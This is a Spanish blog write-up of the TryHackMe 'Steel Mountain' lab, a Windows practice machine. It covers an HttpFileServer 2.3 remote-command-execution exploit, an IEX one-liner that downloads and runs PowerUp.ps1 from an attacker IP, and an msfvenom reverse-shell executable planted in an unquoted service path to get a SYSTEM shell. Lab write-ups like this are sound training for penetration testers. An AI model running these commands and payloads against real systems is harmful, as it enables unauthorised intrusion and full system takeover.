---
layout: single
title: Máquina Steel Mountain - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "Hoy toca comprometer la máquina Steel Mountain, una máquina Windows que en TryHackMe piden resolver por medio de Metasploit y de manera manual. Como de costumbre, solo haremos el modo manual."
date: 2022-02-03
classes: wide
header:
  teaser: /assets/images/steelmountain/portada.jpeg
  teaser_home_page: true
categories:
  - THM
  - Blog
tags:
  - Blog
  - Writeup
  - Guía
  - Walkthrough
---

# Información de la máquina
La máquina se encuentra en la plataforma [TryHackMe](https://tryhackme.com/room/steelmountain) y es la primera de la sección Advanced Exploitation del path Offensive Pentesting. Esta se resuelve por medio de Metasploit o de forma manual, la misma plataforma nos da los pasos para realizarlo de la primera forma pero no ahonda en el método manual ni explica algunas cuestiones. Esta guía tiene el propósito de resolver la máquina de manera manual y aparte explicar algunos detalles que pudieran ser de utilidad, paso a paso. El nombre de Steel Mountain hace referencia a la serie de TV Mr. Robot.

# Reconocimiento
La máquina tiene un sistema operativo Windows, información que nos da TryHackMe. Por medio de un escaneo de puertos con nmap, detectamos aquellos que se encuentren activos con un estatus **open** en la máquina víctima:

	nmap --min-rate 5000 -p- --open -Pn -n 10.10.54.61	-oN portScan

![1]

Vemos que se encuentran habilitados varios puertos entre los que destacan el 80 (HTTP) y el 8080 (otro HTTP); incluso un SMB (139 y 445), pero no serán relevantes.

Si realizamos un escaneo más exhaustivo en busca de servicios y versiones específicas de dichos puertos, nos encontramos con la siguiente información:

![2]

![3]

En el caso del primer servidor HTTP, vemos que está corriendo sobre un **IIS**, el servidor web de Windows. Sin embargo, el segundo puerto **HTTP** (8080) corre bajo un software llamado **HttpFileServer https 2.3**

Este software cuenta con una vulnerabilidad de **Remote Command Execution**, la cual está listada en **ExploitDB** con el ID 49584.

![4]

# RCE mediante HTTP
El POC proporcionado por ExploitDB está más que completo, de hecho él mismo nos devolverá la reverse shell dentro del sistema al ejecutarlo. Lo único que debemos modificar son los parámetros de servidor remoto y local y puertos de conexión:

![5]

Recuerda que **LHOST** y **LPORT** son la dirección IP y puerto de nuestra máquina donde recibiremos la conexión, mientras que **RHOST** y **RPORT** son la IP y puerto del servidor remoto donde ejecutará el exploit.

Adicionalmente, para lograr obtener una shell medianamente interactiva, podemos modificar la útima línea de código del script donde manda a ejecutar una instrucción de sistema, que es el **netcat** que se pondrá a la escucha. Para poder tener un histórico de comandos y poderse mover en la consola recibida, podemos hacer uso de **rlwrap**. De lo contrario, la shell que recibamos no será interactiva.

![6]

Con estos cambios realizados, ya podemos ejecutar el script y veremos que automáticamente recibimos la conexión del servidor, habiendo ganado ya acceso como un usuario no privilegiado llamado **bill**.

![7]

# Escalada de Privilegios
Ya habiendo ganado acceso al sistema, veremos que la conexión la recibimos por medio de una **PowerShell**, por lo que deberemos ejecutar comandos de este intérprete y no de **CMD**. Lo primero que debemos hacer es, por supuesto, ver la flag de usuario:
	
![8]

Ahora, podemos hacer una enumeración del sistema para poder encontrar vías potenciales para explotar alguna vulnerabilidad que nos permitan escalar al usuario **Administrator**. Para ello, nos valemos de un script programado en **PowerShell** que nos permitirá realizar una enumeración automatizada inicial llamado **PowerUP.ps1** (siempre que uso la herramienta recuerdo la canción de [Red Velvet](https://www.youtube.com/watch?v=aiHSVQy9xN8) con el mismo nombre, jaja). Esta herramienta puede ser descargada desde su repositorio en [GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).

Para poder realizar el escaneo una vez invocado en el sistema remoto, deberemos añadir una línea de código al final del script **PowerUp.ps1**:

	Invoke-AllChecks
	
![9]

Este nos permitirá efectuar todos los escaneos con los que fue programado inicialmente, de esta forma nos aseguramos de no perdernos de ningún detalle.

El siguiente paso es ejecutar el script en la máquina víctima, y para ello nos valemos de la herramienta **Invoke-Expression** para poder entablar un socket con un servidor que hayamos establecido inicialmente (como con Python) el cual hostee el script de **PowerUp.ps1**; esto nos permitirá ejecutar el escaneo sin necesidad de copiar el script a la máquina. Este proceso de agregar el **Invoke-AllChecks** y ejecutar el **IEX** nos permite realizar todo en un solo paso; de otro modo, primero tendríamos que copiar el script a la máquina víctima, invocarlo y posteriormente ejecutar el **Invoke-AllChecks**.

	iex(New-Object Net.WebClient).downloadString('http://10.10.188.83:8080/PowerUp.ps1')
	
Recuerda tener iniciado un servidor HTTP con **Python** que proporcione a **PowerShell** del script solicitado:

![10]

![11]

Como podemos observar, ya solo con haber ejecutado el **IEX** nuestro script ya comenzó a realizar el escaneo directamente.

# Unquoted Service Path
De acuerdo con la salida proporcionada por **PowerUp.ps1**, el sistema cuenta con una vulnerabilidad de tipo **Unquoted Service Path** para el servicio **AdvancedSystemCareService9**. Una explicación detallada de este tipo de vulnerabilidad puede encontrarse en el room [Windows Privesc](https://tryhackme.com/room/winprivesc), sin embargo, se dará un pequeño resumen a continuación:

Todos los servicios de Windows corren bajo un ejecutable (.exe) en alguna ruta del sistema. Esta ruta está dada bajo la variable **Path** como se aprecia en la siguiente imagen:

![11]

Este Path será la dirección donde Windows buscará el ejecutable del servicio. El problema existe cuando dicha ruta no se encierra entre comillas, no es lo mismo (para Windows) la ruta:

	C:\Program Files\test
	
A la ruta:

	"C:\Program Files\test"
	
Cuando la ruta está encerrada entre comillas, Windows irá directamente a este directorio por el ejecutable. Por el contrario, si la ruta no está entre comillas, Windows empezará a anexar la terminación **.exe** a cualquier directorio que encuentre, siempre haciendo pausas entre espacios en el path.

Ejemplo:

Si la ruta es C:\Program Files\Main Program\Sub Program\Test.exe, y no está entre **comillas**, Windows buscará primero un ejecutable en esta ruta:

	C:\Program.exe
	
Es decir, se detiene en el primer espacio y añade la terminación **.exe**. Si no encuentra ese ejecutable, entonces seguirá buscando, ahora en la ruta:

	C:\Program Files\Main.exe
	
Y así sucesivamente. Creo que se entiende la idea, ahora, ¿cómo me aprovecho de esto para comprometer el equipo? Todos los servicios corren bajo el usuario **Administrator**, por lo tanto, si se cumplen los siguientes requisitos:

	1. Tener permisos de escritura en algún directorio del path donde se ubica el ejecutable del servicio
	2. Tener permisos para reiniciar dicho servicio
	
Entonces podemos colocar un ejecutable malicioso que ejecute alguna acción (como una reverse shell) y este será ejecutado por el usuario **Administrator** cuando nosotros reiniciemos el servicio.

Con esto en mente, entonces, enfoquémonos nuevamente en la máquina que estamos resolviendo. La ruta no cuenta con comillas, por lo que es vulnerable.

	C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
	
La primera ruta que intentaríamos es la siguiente:

	C:\Program.exe
	
Sin embargo, pocas veces se tienen permisos de escritura en el directorio **C:**, así que movámonos a la siguiente posibilidad:

	C:\Program Files (x86)\IObit\Advanced.exe
	
En este caso, sí tenemos permisos de escritura dentro del directorio **IObit**, por lo que podemos colocar un ejecutable llamado **Advanced.exe** aquí. Primero, lo creamos con ayuda de msfvenom:

	msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.188.83 LPORT=443 -f exe -o Advanced.exe
	
![12]

Con el ejecutable ya listo, ahora debemos moverlo a la máquina, específicamente el directorio **IObit**. Para ello, volvemos a iniciar un servidor HTTP con **Python** y ejecutamos la instrucción **Invoke-WebRequest** de PowerShell:

	iwr -uri "http://10.10.188.83:8080/Advanced.exe" -outfile "Advanced.exe"
	
![13]

Ahora revisamos el servicio para cerciorarnos de que esté corriendo:

	get-service AdvancedSystemCareService9
	
Recuerda que estamos en una termninal de **PowerShell**, para hacerlo en una **CMD** deberíamos ejecutar:

	sc query AdvancedSystemCareService9
	
![14]

Ahora solo resta reiniciar el servicio. Para ello debemos detenerlo e inmediatamente después volver a iniciarlo. Esto se debe hacer ya con una consola en segundo plano escuchando con **netcat** para recibir la reverse shell:

	stop-service AdvancedSystemCareService9
	
![15]

Si ahora iniciamos el servicio nuevamente:

	start-service AdvancedSystemCareService9
	
Veremos como este se queda un momento colgado, esto es buen indicio de que el **.exe** malicioso se está ejecutando.

![16]

Si ahora nos vamos a nuestra termina con **netcat** veremos que hemos recibido una conexión por parte del servidor con el usuario administrador, el cual es **nt authority\system**:

![17]

Por último, solo nos resta mostrar la flag de root. COn esto, hemos terminado de comprometer la máquina.

![18]

[1]:/assets/images/steelmountain/1.png
[2]:/assets/images/steelmountain/2.png
[3]:/assets/images/steelmountain/3.png
[4]:/assets/images/steelmountain/4.png
[5]:/assets/images/steelmountain/5.png
[6]:/assets/images/steelmountain/6.png
[7]:/assets/images/steelmountain/7.png
[8]:/assets/images/steelmountain/8.png
[9]:/assets/images/steelmountain/9.png
[10]:/assets/images/steelmountain/10.png
[11]:/assets/images/steelmountain/11.png
[12]:/assets/images/steelmountain/12.png
[13]:/assets/images/steelmountain/13.png
[14]:/assets/images/steelmountain/14.png
[15]:/assets/images/steelmountain/15.png
[16]:/assets/images/steelmountain/16.png
[17]:/assets/images/steelmountain/17.png
[18]:/assets/images/steelmountain/18.png